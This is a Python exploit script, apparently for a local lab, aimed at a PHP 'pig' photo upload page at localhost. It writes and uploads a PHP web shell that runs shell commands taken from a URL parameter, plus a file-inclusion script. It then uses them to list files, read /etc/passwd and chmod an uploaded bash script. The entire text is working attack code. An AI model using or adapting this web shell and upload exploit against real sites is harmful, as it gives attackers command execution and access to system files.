import requests

# Base URL to be set at the top
BASE_URL = "http://localhost:8888/pig/uploadfolder/"

def create_php_file():
    php_code = """<?php
if (isset($_GET['cmd'])) {
    $cmd = $_GET['cmd'];
    $output = shell_exec($cmd);
    echo "<pre>$output</pre>";
} else {
    echo "No command provided.";
}
?>"""
    with open("command.php", "w") as file:
        file.write(php_code)

def create_lfi_php_file():
    lfi_php_code = """<?php
if (isset($_GET['file'])) {
    $file = $_GET['file'];
    if (file_exists($file)) {
        include($file);
    } else {
        echo "File does not exist.";
    }
} else {
    echo "No file specified.";
}
?>"""
    with open("lfi.php", "w") as file:
        file.write(lfi_php_code)

def create_malicious_bash_file():
    bash_code = """#!/bin/bash
echo "Malicious Bash Script Executed" > ./malicious_script.txt
"""
    with open("malicious_script.sh", "w") as file:
        file.write(bash_code)

def upload_file(url, data, files):
    for file in files:
        response = requests.post(url, data=data, files={
            'pigphoto': file
        })
    return response

def execute_command(command_url, command):
    response = requests.get(f"{command_url}?cmd={command}")
    return response

def test_lfi(lfi_url, file_path):
    response = requests.get(f"{lfi_url}?file={file_path}")
    return response

def test_bash_script(script_url, script_name):
    # Making the script executable (this will be done remotely, so it might need different handling depending on the server configuration)
    make_executable_url = f"{script_url}?cmd=chmod%20+x%20{script_name}"
    print('make executable', make_executable_url)
    chmod_response = requests.get(make_executable_url)
    
    if chmod_response.status_code == 200:
        print("Made the bash script executable successfully.")
    else:
        print(f"Failed to make the bash script executable. Status code: {chmod_response.status_code}")
    
    # Accessing the script
    response = requests.get(script_url)
    return response

def main():
    create_php_file()
    create_lfi_php_file()
    create_malicious_bash_file()

    upload_url = BASE_URL + "add-pig.php"
    data = {
        'submit': 'Upload',
    }
    files = [
        ('command.php', open('command.php', 'rb'), 'application/x-php'),
        ('lfi.php', open('lfi.php', 'rb'), 'application/x-php'),
        ('malicious_script.sh', open('malicious_script.sh', 'rb'), 'application/x-sh')
    ]
    
    upload_response = upload_file(upload_url, data, files)

    if upload_response.status_code == 200:
        print("File uploaded successfully.")
        
        command_url = BASE_URL + "command.php"
        command = "ls"
        command_response = execute_command(command_url, command)
        if command_response.status_code == 200:
            print("Command executed successfully.")
            print("Response:")
            print(command_response.text)
            
        else:
            print(f"Failed to execute command. Status code: {command_response.status_code}")
        
        print('\n\n\n\n')

        lfi_url = BASE_URL + "lfi.php"
        lfi_file_path = "/etc/passwd"
        lfi_response = test_lfi(lfi_url, lfi_file_path)
        if lfi_response.status_code == 200:
            print("LFI test executed successfully.")
            print("Response:")
            print(lfi_response.text)
        else:
            print(f"Failed to test LFI. Status code: {lfi_response.status_code}")

        print('\n\n\n\n')

        script_url = BASE_URL + "malicious_script.sh"
        bash_script_response = test_bash_script(script_url, 'malicious_script.sh')
        if bash_script_response.status_code == 200:
            print("Malicious bash script accessed successfully.")
            print("Response:")
            print(bash_script_response.text)
        else:
            print(f"Failed to access the bash script. Status code: {bash_script_response.status_code}")

    else:
        print(f"Failed to upload file. Status code: {upload_response.status_code}")


main()
